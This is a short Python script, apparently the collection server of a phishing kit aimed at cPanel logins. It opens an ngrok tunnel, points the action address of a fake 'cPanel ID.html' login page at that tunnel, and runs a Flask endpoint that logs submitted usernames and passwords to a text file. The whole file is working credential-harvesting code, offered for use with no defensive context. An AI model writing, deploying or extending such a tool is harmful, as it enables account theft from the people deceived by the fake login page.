from flask import Flask, request, send_file
from pyngrok import ngrok
import os

if not os.path.exists("ups.txt"):open("ups.txt",'w').close()

http_tunnel = ngrok.connect(5111)
address=(str(http_tunnel).split(" ")[1])
address=address.replace("http","https")
print(address)

with open("cPanel ID.html",'r') as cp:
	html=cp.read()
	addloc=html.find("let address = ")
	add=html[addloc:addloc+54]
	url=add.split('"')[1]
	print(url)
	html=html.replace(f'"{url}"',f'{address}')
with open("cPanel ID.html",'w') as cp:
	cp.write(html)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def up():
	
    user,password = str(request.args['user']).split(':')
    print(f'user:{user} password:{password}')
    with open("ups.txt",'a') as ups:
    	ups.write(request.args['user']+'\n')
    return 'login'

app.run(host='0.0.0.0', port=5111,debug=False)

